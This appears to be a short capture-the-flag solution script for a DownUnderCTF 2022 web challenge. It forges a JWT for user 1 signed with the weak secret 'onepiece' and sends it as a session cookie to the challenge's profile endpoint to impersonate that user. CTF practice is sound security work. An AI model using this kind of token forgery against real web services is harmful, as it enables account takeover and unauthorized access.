from requests import get
import jwt
import re
encoded_jwt = jwt.encode({'sub': 1}, 'onepiece', algorithm='HS256')
print(encoded_jwt)
r = get('https://web-treasure-hunt-e9a4730c2093.2022.ductf.dev/profile',
        headers={'Cookie': f'access_token_cookie={encoded_jwt}'})
print(r)
print(r.text)
